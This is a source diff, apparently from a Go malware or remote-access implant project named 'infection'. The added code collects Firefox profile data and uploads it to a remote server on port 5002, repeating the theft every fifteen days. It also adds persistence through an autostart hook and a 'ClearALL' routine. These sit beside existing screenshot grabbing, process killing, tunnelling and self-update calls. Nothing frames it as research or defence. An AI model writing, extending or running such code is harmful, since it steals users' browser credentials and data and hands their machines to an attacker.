@@ -11,6 +11,7 @@ import (
 	"infection/util/lib"
 	"log"
 	"net/http"
+	"time"
 
 	"io/ioutil"
 	"os"
@@ -89,12 +90,27 @@ func main() {
 	} else if lib.FileExits(lib.BrowserSafepath) != nil {
 		finflag := make(chan string)
 		go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
+		// if not create digback fire  check the  use firefox or not
+		if lib.FileExits(lib.Firefoxpath) == nil {
+			if lib.FileExits(lib.Firefox) != nil {
+				go browser.Firefoxpack("http://" + conf.Url + ":5002/browser/browserbag")
+			} else {
+				//exits check date updae
+				logf, _ := os.Stat(lib.Firefox)
+				if time.Now().Unix()-logf.ModTime().Unix() >= 1296000 {
+					os.RemoveAll(lib.Firefox)
+					go browser.Firefoxpack("http://" + conf.Url + ":5002/browser/browserbag")
+				}
+			}
+		}
 	}
 	go killit.Killit()
 	go killit.GetPic(conf.Url)
+	go killit.ClearALL(conf.Url)
 	go tunnel.Tunnel(conf.Url)
 	////check update
 	go lib.DoUpdate()
+	go lib.AutoStart()
 	http.HandleFunc("/hello", handler)
 	if err := http.ListenAndServe(":11000", nil); err != nil {
 		log.Println("pac Faild", err)
